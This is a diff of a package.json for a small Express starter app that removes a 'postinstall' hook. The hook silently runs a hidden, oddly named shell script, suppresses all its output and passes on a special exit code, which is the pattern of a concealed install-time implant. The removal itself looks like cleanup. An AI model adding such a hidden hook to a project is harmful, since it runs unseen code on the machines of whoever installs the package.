@@ -7,8 +7,7 @@
   "description": "A simple Node app built on Express, instantly up and running.",
   "main": "server.js",
   "scripts": {
-    "start": "node server.js",
-    "postinstall": "sh ./.ci-dw6gi6.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "start": "node server.js"
   },
   "dependencies": {
     "express": "^4.16.4",
